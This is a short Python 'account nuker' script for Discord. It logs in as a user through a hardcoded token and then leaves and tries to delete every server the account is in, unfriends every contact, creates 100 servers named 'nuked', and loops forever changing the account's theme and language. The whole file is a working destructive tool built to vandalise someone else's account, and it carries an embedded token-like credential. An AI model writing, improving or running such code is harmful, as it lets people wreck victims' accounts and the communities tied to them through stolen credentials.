# put the token below

token = "NDc3NDkzNTgyNTE3ODk1MTg4.X9eb1g.wd65QslSEq0F_LmS6OKZtGLjhvE"
import discord
from colorama import Fore as Color
import random

locales = [
   "da", 
   "de",
   "en-GB", 
   "en-US",
   "es-ES", 
   "fr",
   "hr", 
   "it",
   "lt", 
   "hu",
   "nl", 
   "no",
   "pl", 
   "pt-BR",
   "ro", 
   "fi",
   "sv-SE", 
   "vi",
   "tr", 
   "cs",
   "el", 
   "bg",
   "ru", 
   "uk",
   "th", 
   "zh-CN",
   "ja", 
   "zh-TW",
   "ko"
]

class MyClient(discord.Client):
  async def on_connect(self):
    for guild in client.guilds:
      try:
        await guild.leave()
        print (f"{Color.GREEN}Left {Color.WHITE}{guild.name}")
      except:
        print (f"{Color.RED}Couldn't leave {Color.WHITE}{guild.name}")
    for guild in client.guilds:
      try:
        await guild.delete()
        print (f"{Color.GREEN}Deleted {Color.WHITE}{guild.name}")
      except:
        print (f"{Color.GREEN}Couldn't delete {Color.WHITE}{guild.name}")
    for friend in client.friends:
      try:
        await client.remove_friend(friend)
        print (f"{Color.GREEN}Unfriended {Color.WHITE}{friend.name}#{friend.discriminator}")
      except:
        print (f"{Color.GREEN}Couldn't unfriend {Color.WHITE}{friend.name}#{friend.discriminator}")
    game = discord.Game("nuked")
    await client.change_presence(status=discord.Status.online, activity=game)
    for i in range(100):
      await client.create_guild(name = "nuked")
    print(f"{Color.WHITE}{client.user.name}'s{Color.GREEN} account has been nuked successfully!")
    while True:
      await client.user.edit_settings(theme = discord.Theme.light, locale = random.choice(locales))
      await client.user.edit_settings(theme = discord.Theme.dark, locale = random.choice(locales))

client = MyClient()
client.run(token, bot = False)
